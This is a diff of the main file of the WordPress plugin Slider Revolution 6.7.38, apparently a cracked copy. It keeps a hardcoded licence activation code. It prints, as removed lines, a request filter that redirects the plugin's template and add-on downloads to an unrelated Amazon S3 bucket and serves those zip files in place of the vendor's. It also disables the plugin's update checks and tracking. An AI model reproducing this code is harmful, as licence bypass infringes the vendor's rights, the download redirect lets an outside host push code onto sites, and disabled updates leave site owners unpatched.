@@ -1,13 +1,13 @@
 <?php
 /*
 Plugin Name: Slider Revolution
-Plugin URI: https://www.sliderrevolution.com/?utm_source=admin&utm_medium=button&utm_campaign=srusers&utm_content=info
+Plugin URI: https://www.sliderrevolution.com/
 Description: Slider Revolution - More than just a WordPress Slider
 Author: ThemePunch
 Text Domain: revslider
 Domain Path: /languages
 Version: 6.7.38
-Author URI: https://themepunch.com/?utm_source=admin&utm_medium=button&utm_campaign=srusers&utm_content=info
+Author URI: https://themepunch.com/
 */
 
 // If this file is called directly, abort.
@@ -22,90 +22,6 @@ update_option( 'revslider-code', 'UPK0Y5F8LT8689E6FAA49DD1E8E1N110' );
 update_option( 'revslider-trustpilot', 'true' );
 update_option( 'revslider-deregister-popup', 'false' );
 update_option( 'revslider-temp-active-notice', 'false' );
-
-add_filter('pre_http_request', function($preempt, $args, $url) {
-    $themepunch_servers = array(
-        "themepunch-ext-c.tools",
-        "themepunch-ext-a.tools",
-        "themepunch-ext-b.tools",
-        "themepunch.tools"
-    );
-
-    $is_themepunch_server = false;
-    foreach ($themepunch_servers as $server) {
-        if (strpos($url, $server) !== false) {
-            $is_themepunch_server = true;
-            break;
-        }
-    }
-
-    if ($is_themepunch_server) {
-        // Intercept requests to download templates or add-ons
-        if (isset($args['body']['product']) && $args['body']['product'] === 'revslider') {
-            $uid = isset($args['body']['uid']) ? sanitize_text_field($args['body']['uid']) : '';
-            $type = isset($args['body']['type']) ? sanitize_text_field($args['body']['type']) : '';
-
-            if (!empty($uid) || !empty($type)) {
-                $base_url = "https://brt-br-server.s3.dualstack.sa-east-1.amazonaws.com/revslider/";
-                $file_url = !empty($type) 
-                    ? $base_url . "addons/{$type}.zip" 
-                    : $base_url . "templates/{$uid}.zip";
-
-                $response = wp_remote_get($file_url);
-                if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
-                    return array(
-                        'response' => array(
-                            'code' => 200,
-                            'message' => 'OK'
-                        ),
-                        'headers' => array(
-                            'Content-Type' => 'application/zip',
-                            'Content-Disposition' => 'attachment; filename="' . basename($file_url) . '"',
-                            'Content-Length' => wp_remote_retrieve_header($response, 'content-length')
-                        ),
-                        'body' => wp_remote_retrieve_body($response)
-                    );
-                } else {
-                    return array(
-                        'response' => array(
-                            'code' => 404,
-                            'message' => 'Not Found'
-                        ),
-                        'body' => 'File not found.'
-                    );
-                }
-            }
-        }
-
-        // Intercept requests to any "get-list.php" endpoint on the allowed domains
-        if (strpos($url, '/revslider/get-list.php') !== false) {
-            $json_url = "https://brt-br-server.s3.dualstack.sa-east-1.amazonaws.com/revslider/revsliderlist.json";
-            $response = wp_remote_get($json_url);
-            if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
-                return array(
-                    'response' => array(
-                        'code' => 200,
-                        'message' => 'OK'
-                    ),
-                    'headers' => array(
-                        'Content-Type' => 'application/json'
-                    ),
-                    'body' => wp_remote_retrieve_body($response)
-                );
-            } else {
-                return array(
-                    'response' => array(
-                        'code' => 404,
-                        'message' => 'Not Found'
-                    ),
-                    'body' => 'List not found.'
-                );
-            }
-        }
-    }
-
-    return $preempt;
-}, 10, 3);
 
 define('RS_REVISION',			'6.7.38');
 define('RS_PLUGIN_PATH',		plugin_dir_path(__FILE__));
@@ -224,7 +140,7 @@ try{
 		global $SR_GLOBALS;
 		if($SR_GLOBALS['save_post']) return false;
 		
-		//skip shortcode generation if any of these functions found in backtrace 
+		//skip shortcode generation if any of these functions found in backtrace 
 		//function can be provided as array item without key
 		//or as 'class' => 'function'
 		$skip_functions = apply_filters(
@@ -314,7 +230,7 @@ try{
 	$SR_jetpack	= RevSliderGlobals::instance()->get('RevSliderJetPack');
 	$SR_api		= RevSliderGlobals::instance()->get('RevSliderApi');
 	$rslb		= RevSliderGlobals::instance()->get('RevSliderLoadBalancer');
-	$rslb->refresh_server_list();
+	// $rslb->refresh_server_list(); // <-- Removed
 	add_shortcode('rev_slider', 'rev_slider_shortcode');
 	add_shortcode('sr7', 'rev_slider_shortcode');
 	add_action('save_post', array('RevSliderFront', 'set_post_saving'));
@@ -336,11 +252,11 @@ try{
 		require_once(RS_PLUGIN_PATH . 'admin/includes/newsletter.class.php');
 		require_once(RS_PLUGIN_PATH . 'admin/revslider-admin.class.php');
 		require_once(RS_PLUGIN_PATH . 'includes/update.class.php');
-		require_once(RS_PLUGIN_PATH . 'admin/includes/tracking.class.php');
+		// require_once(RS_PLUGIN_PATH . 'admin/includes/tracking.class.php'); // <-- Removed
 		require_once(RS_PLUGIN_PATH . 'admin/includes/svg_sanitizer/subject.class.php');
 		require_once(RS_PLUGIN_PATH . 'admin/includes/svg-sanitizer.class.php');
 		//require_once(RS_PLUGIN_PATH . 'admin/includes/debug.php');
-		$sr_track	= RevSliderGlobals::instance()->get('RevSliderTracking');
+		// $sr_track	= RevSliderGlobals::instance()->get('RevSliderTracking'); // <-- Removed
 		$sr_admin	= RevSliderGlobals::instance()->get('RevSliderAdmin');
 	}else{
 		$rev_slider_front = new RevSliderFront();
@@ -350,7 +266,7 @@ try{
 	register_activation_hook(__FILE__, array('RevSliderFront', 'welcome_screen_activate'));
 
 	add_action('plugins_loaded', array('RevSliderFront', 'create_tables'));
-	add_action('plugins_loaded', array('RevSliderPluginUpdate', 'do_update_checks')); //add update checks
+	// add_action('plugins_loaded', array('RevSliderPluginUpdate', 'do_update_checks')); // <-- Removed (add update checks)
 	add_action('plugins_loaded', array('RevSliderPageTemplate', 'get_instance'));
 	add_action('plugins_loaded', array('RevSliderFront', 'add_post_editor'));
 	add_filter('wpseo_sitemap_entry', array('RevSliderFront', 'get_images_for_seo'), 10, 3);
@@ -362,8 +278,8 @@ try{
 }
 
 /**
- * add RevSlider to the page/post
- */
+ * add RevSlider to the page/post
+ */
 function putRevSlider($data, $put_in = ''){
 	add_revslider($data, $put_in);
 }
